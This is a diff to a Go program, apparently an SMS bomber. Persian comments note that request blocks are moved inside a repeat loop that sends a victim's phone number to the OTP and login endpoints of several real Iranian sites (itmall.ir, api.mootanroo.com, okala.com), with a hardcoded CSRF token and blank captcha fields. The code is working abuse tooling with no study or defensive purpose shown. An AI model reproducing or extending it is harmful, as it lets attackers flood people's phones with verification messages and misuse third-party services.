@@ -260,7 +260,34 @@ func main() {
 	}
 
 	for i := 0; i < repeatCount; i++ {
-		
+		// کدهای قبلی شما (itmall.ir و api.mootanroo.com)
+		// 1. itmall.ir (Form)
+		wg.Add(1)
+		tasks <- func() {
+			formData := url.Values{}
+			formData.Set("action", "digits_check_mob")
+			formData.Set("countrycode", "+98")
+			formData.Set("mobileNo", phone)
+			formData.Set("csrf", "e57d035242")
+			formData.Set("login", "2")
+			formData.Set("username", "")
+			formData.Set("email", "")
+			formData.Set("captcha", "")
+			formData.Set("captcha_ses", "")
+			formData.Set("json", "1")
+			formData.Set("whatsapp", "0")
+			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+		}
+		// 1. api.mootanroo.com (JSON)
+		wg.Add(1)
+		tasks <- func() {
+			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
+				"PhoneNumber": phone,
+			}, &wg, ch)
+		}
+
+		// --- اضافه کردن URLهای جدید ---
+
 		// okala.com - OTPRegister (JSON)
 		wg.Add(1)
 		tasks <- func() {
@@ -645,32 +672,8 @@ func main() {
 		// در حال حاضر به کدهای شما اضافه نشده است زیرا فرمت بدنه نامعمول دارد.
 
 	}
-                // 1. itmall.ir (Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action", "digits_check_mob")
-			formData.Set("countrycode", "+98")
-			formData.Set("mobileNo", phone)
-			formData.Set("csrf", "e57d035242")
-			formData.Set("login", "2")
-			formData.Set("username", "")
-			formData.Set("email", "")
-			formData.Set("captcha", "")
-			formData.Set("captcha_ses", "")
-			formData.Set("json", "1")
-			formData.Set("whatsapp", "0")
-			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-		// 1. api.mootanroo.com (JSON)
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
-				"PhoneNumber": phone, 
-			}, &wg, ch)
-		}
-	}
 
+	// ... (بقیه کدهای main تابع بدون تغییر) ...
 	close(tasks)
 
 	go func() {
